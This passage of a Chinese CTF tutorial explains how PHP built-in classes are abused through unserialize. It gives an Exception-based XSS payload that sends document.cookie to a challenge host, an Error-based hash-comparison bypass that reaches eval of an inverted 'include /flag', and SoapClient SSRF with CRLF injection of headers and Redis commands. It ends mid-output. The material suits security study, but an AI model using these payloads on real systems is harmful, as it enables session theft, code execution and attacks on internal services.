<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230624194213912.png" alt="image-20230624194213912"></p>
<p><strong>[BJDCTF 2nd]xss之光</strong></p>
<p>不知道为何BUU里面这道题没了，只好看着别人的说一次。</p>
<p>进入题目，首先通过git泄露拿到源码：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'yds_is_so_beautiful'</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);</code></pre>
<p>仅看到一个反序列化函数并没有给出需要反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找PHP内置类来进行反序列化。又发现有个echo，没得跑了，就是我们刚才演示的利用Error或Exception内置类进行XSS，但是查看一下题目的环境发现是PHP 5，所以我们要使用Exception类。</p>
<p>由于此题是xss，所以只要xss执行window.open()就能把flag带出来，所以POC如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">"&lt;script&gt;window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt;"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>));
<span class="hljs-meta">?&gt;</span>
 
<span class="hljs-comment">// 输出O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></code></pre>
<p>执行后，得到flag就在 cookie 中。</p>
<h3 id="102-errorexception-内置类绕过哈希比较">10.2 Error/Exception 内置类绕过哈希比较</h3>
<h4 id="error-类">Error 类</h4>
<p><strong>Error</strong> 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。</p>
<p><strong>类摘要：</strong></p>
<pre><code class="hljs php"><span class="hljs-built_in">Error</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">Throwable</span> {
    <span class="hljs-comment">/* 属性 */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;
    <span class="hljs-comment">/* 方法 */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">""</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">private</span> <span class="hljs-title function_ invoke__">__clone</span> ( ) : <span class="hljs-keyword">void</span>
}</code></pre>
<p><strong>类属性：</strong></p>
<pre><code class="hljs plaintext">- message：错误消息内容
- code：错误代码
- file：抛出错误的文件名
- line：抛出错误在该文件中的行数</code></pre>
<p><strong>类方法：</strong></p>
<pre><code class="hljs plaintext">- `Error::__construct` — 初始化 error 对象
- `Error::getMessage` — 获取错误信息
- `Error::getPrevious` — 返回先前的 Throwable
- `Error::getCode` — 获取错误代码
- `Error::getFile` — 获取错误发生时的文件
- `Error::getLine` — 获取错误发生时的行号
- `Error::getTrace` — 获取调用栈（stack trace）
- `Error::getTraceAsString` — 获取字符串形式的调用栈（stack trace）
- `Error::__toString` — error 的字符串表达
- `Error::__clone` — 克隆 error</code></pre>
<h4 id="exception-类">Exception 类</h4>
<p><strong>Exception</strong> 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。</p>
<p><strong>类摘要：</strong></p>
<pre><code class="hljs php"><span class="hljs-built_in">Exception</span> {
    <span class="hljs-comment">/* 属性 */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;
    <span class="hljs-comment">/* 方法 */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">""</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">private</span> <span class="hljs-title function_ invoke__">__clone</span> ( ) : <span class="hljs-keyword">void</span>
}</code></pre>
<p><strong>类属性：</strong></p>
<pre><code class="hljs plaintext">- message：异常消息内容
- code：异常代码
- file：抛出异常的文件名
- line：抛出异常在该文件中的行号</code></pre>
<p><strong>类方法：</strong></p>
<pre><code class="hljs plaintext">- `Exception::__construct` — 异常构造函数
- `Exception::getMessage` — 获取异常消息内容
- `Exception::getPrevious` — 返回异常链中的前一个异常
- `Exception::getCode` — 获取异常代码
- `Exception::getFile` — 创建异常时的程序文件名称
- `Exception::getLine` — 获取创建的异常所在文件中的行号
- `Exception::getTrace` — 获取异常追踪信息
- `Exception::getTraceAsString` — 获取字符串类型的异常追踪信息
- `Exception::__toString` — 将异常对象转换为字符串
- `Exception::__clone` — 异常克隆</code></pre>
<p>我们可以看到，在Error和Exception这两个PHP原生类中内都有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p>
<p>我们以Error为例，我们看看当触发他的 <code>__toString</code> 方法时会发生什么：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"payload"</span>,<span class="hljs-number">1</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;</code></pre>
<p>输出：</p>
<pre><code class="hljs php"><span class="hljs-built_in">Error</span>: payload in /<span class="hljs-keyword">var</span>/www/html/tmp/test.php:<span class="hljs-number">2</span>
Stack trace:
<span class="hljs-comment">#0 {main}</span></code></pre>
<p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error("payload",1)</code> 中的错误代码“1”则没有输出出来。</p>
<p>在来看看下一个例子：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"payload"</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"payload"</span>,<span class="hljs-number">2</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"\r\n\r\n"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;</code></pre>
<p>输出：</p>
<pre><code class="hljs php"><span class="hljs-built_in">Error</span>: payload in /<span class="hljs-keyword">var</span>/www/html/tmp/test.php:<span class="hljs-number">2</span>
Stack trace:
<span class="hljs-comment">#0 {main}</span>
 
<span class="hljs-built_in">Error</span>: payload in /<span class="hljs-keyword">var</span>/www/html/tmp/test.php:<span class="hljs-number">2</span>
Stack trace:
<span class="hljs-comment">#0 {main}</span></code></pre>
<p>可见，<code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</p>
<p>Exception 类与 Error 的使用和结果完全一样，只不过 <code>Exception</code> 类适用于PHP 5和7，而 <code>Error</code> 只适用于 PHP 7。</p>
<p>Error和Exception类的这一点在绕过在PHP类中的哈希比较时很有用。</p>
<p>[<a target="_blank" rel="noopener" href="http://81.71.121.131/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/">2020 极客大挑战]Greatphp</a></p>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) ){
           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/\&lt;\?php|\(|\)|\"|\'/"</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>)){
               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);
           } <span class="hljs-keyword">else</span> {
               <span class="hljs-keyword">die</span>(<span class="hljs-string">"Try Hard !!"</span>);
           }
           
        }
    }
}

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'great'</span>])){
    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'great'</span>]);
} <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}

<span class="hljs-meta">?&gt;</span></code></pre>
<p>​		我们可以将题目代码中的 $syc 和 $lover 分别声明为类似上面的内置类的对象，让这两个对象本身不同（传入的错误代码即可），但是 __toString 方法输出的结果相同即可<br>
​		由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 include “/flag” 将flag包含进来即可；由于过滤了引号，我们直接用url取反绕过即可</p>
<p>poc：这里说一下url取反</p>
<p><strong>URL编码取反绕过</strong></p>
<pre><code>适用PHP版本：无限制
当PHP&gt;=7时，可以直接利用取反构造payload

PS C:\Users\Administrator&gt; php -r "var_dump(urlencode(~'phpinfo'));"
Command line code:1:
string(21) "%8F%97%8F%96%91%99%90"

//实际上
(~%8F%97%8F%96%91%99%90)();
#phpinfo();
</code></pre>
<pre><code class="hljs php"><span class="hljs-comment">//利用链如下</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$str</span> = <span class="hljs-string">"?&gt;&lt;?=include~"</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">"%D0%99%93%9E%98"</span>).<span class="hljs-string">"?&gt;"</span>;   <span class="hljs-comment">//~urldecode=/flag</span>
<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">2</span>);
<span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>();
<span class="hljs-variable">$c</span>-&gt;syc = <span class="hljs-variable">$a</span>;
<span class="hljs-variable">$c</span>-&gt;lover = <span class="hljs-variable">$b</span>;
<span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>)));
<span class="hljs-meta">?&gt;</span>
<span class="hljs-comment">//这里解释以下，为什么要闭合掉"?&gt;"，因为前面可能会有一些报错的信息，所以可以先闭合掉前面的东西，然后再来包含后面的是取反，因为在链里面所以需要用到解码，不用编码绕不过去正则，里面是/flag因为刷题多了都在根目录下面，不在的话正能一步步尝试。</span></code></pre>
<h3 id="103-soapclient-类进行-ssrf">10.3 SoapClient 类进行 SSRF</h3>
<h4 id="soapclient-类">SoapClient 类</h4>
<p>SOAP（简单对象访问协议）是连接Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式，仅限于http/https协议。SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。</p>
<p><strong>如果想要使用SoapClient类需要在php.ini配置文件里面开启extension=php_soap.dll选项</strong></p>
<p><strong>类摘要：</strong></p>
<pre><code class="hljs php">SoapClient {
    <span class="hljs-comment">/* 方法 */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$wsdl</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> = [] )
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__call</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span> ) : <span class="hljs-keyword">mixed</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__doRequest</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$request</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$action</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$version</span> , <span class="hljs-keyword">bool</span> <span class="hljs-variable">$oneWay</span> = <span class="hljs-literal">false</span> ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getCookies</span> ( ) : <span class="hljs-keyword">array</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getFunctions</span> ( ) : <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequest</span> ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequestHeaders</span> ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponse</span> ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponseHeaders</span> ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getTypes</span> ( ) : <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setCookie</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$value</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">void</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setLocation</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> = <span class="hljs-string">""</span> ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setSoapHeaders</span> ( SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$headers</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">bool</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__soapCall</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span> , <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$options</span> = <span class="hljs-literal">null</span> , SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$inputHeaders</span> = <span class="hljs-literal">null</span> , <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$outputHeaders</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">mixed</span>
}</code></pre>
<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
<p>该类的构造函数如下：</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> SoapClient :: <span class="hljs-title function_ invoke__">SoapClient</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$wsdl</span> [，<span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> ])</code></pre>
<ul>
<li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li>
<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li>
</ul>
<p><strong>使用 SoapClient 类进行 SSRF</strong></p>
<p>知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'location'</span>=&gt;<span class="hljs-string">'http://192.168.91.153:2333/aaa'</span>, <span class="hljs-string">'uri'</span>=&gt;<span class="hljs-string">'http://192.168.91.153:2333'</span>));
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;
<span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);
<span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>example：</p>
<p>首先在192.168.91.153:2333上起一个监听，然后再执行上述代码，就能够成功发送HTTP请求：</p>
<pre><code class="hljs php">root@ubuntu18:~<span class="hljs-comment"># nc -lvp 2333</span>
Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">2333</span>)
Connection <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">91.1</span> <span class="hljs-number">7856</span> received!
POST /aaa HTTP/<span class="hljs-number">1.1</span>
Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">91.153</span>:<span class="hljs-number">2333</span>
Connection: Keep-Alive
User-Agent: PHP-SOAP/<span class="hljs-number">7.4</span>.<span class="hljs-number">3</span>
Content-Type: text/xml; charset=utf-<span class="hljs-number">8</span>
SOAPAction: <span class="hljs-string">"http://192.168.91.153:2333#a"</span>
Content-Length: <span class="hljs-number">387</span>
 
<span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span>
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns:ns1=<span class="hljs-string">"http://192.168.91.153:2333"</span> xmlns:xsd=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span> xmlns:SOAP-ENC=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span> SOAP-ENV:encodingStyle=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</code></pre>
<p>这里不知为何我开启不了这个类,先看个思路</p>
<p>但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。</p>
<p>如下测试代码，我们在HTTP头中插入一个cookie：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$target</span> = <span class="hljs-string">'http://192.168.91.153:2333/'</span>;
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'location'</span> =&gt; <span class="hljs-variable">$target</span>, <span class="hljs-string">'user_agent'</span> =&gt; <span class="hljs-string">"WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4"</span>, <span class="hljs-string">'uri'</span> =&gt; <span class="hljs-string">'test'</span>));
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;
<span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);
<span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>执行代码后，如下图所示，成功在HTTP头中插入了一个我们自定义的cookie：</p>
<pre><code class="hljs php">root@ubuntu18:~<span class="hljs-comment"># nc -lvp 2333</span>
Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">2333</span>)
Connection <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">91.1</span> <span class="hljs-number">7858</span> received!
POST / HTTP/<span class="hljs-number">1.1</span>
Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">91.153</span>:<span class="hljs-number">2333</span>
Connection: Keep-Alive
User-Agent: WHOAMI
Cookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4        <span class="hljs-comment"># 插入的cookie</span>
Content-Type: text/xml; charset=utf-<span class="hljs-number">8</span>
SOAPAction: <span class="hljs-string">"test#a"</span>
Content-Length: <span class="hljs-number">365</span>
 
<span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span>
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns:ns1=<span class="hljs-string">"test"</span> xmlns:xsd=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span> xmlns:SOAP-ENC=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span> SOAP-ENV:encodingStyle=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</code></pre>
<p>利用HTTP协议去攻击Redis：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$target</span> = <span class="hljs-string">'http://192.168.91.153:2333/'</span>;
<span class="hljs-variable">$poc</span> = <span class="hljs-string">"CONFIG SET dir /var/www/html"</span>;
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'location'</span> =&gt; <span class="hljs-variable">$target</span>, <span class="hljs-string">'uri'</span> =&gt; <span class="hljs-string">'hello^^'</span>.<span class="hljs-variable">$poc</span>.<span class="hljs-string">'^^hello'</span>));
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'^^'</span>,<span class="hljs-string">"\n\r"</span>,<span class="hljs-variable">$b</span>); 
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;
<span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);
<span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>执行代码后，如下图所示，成功插入了Redis命令：</p>
<pre><code class="hljs php">root@ubuntu18:~<span class="hljs-comment"># nc -lvp 2333</span>
Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">2333</span>)
Connection <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">91.1</span> <span class="hljs-number">7860</span> received!
POST / HTTP/<span class="hljs-number">1.1</span>
Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">91.153</span>:<span class="hljs-number">2333</span>
Connection: Keep-Alive
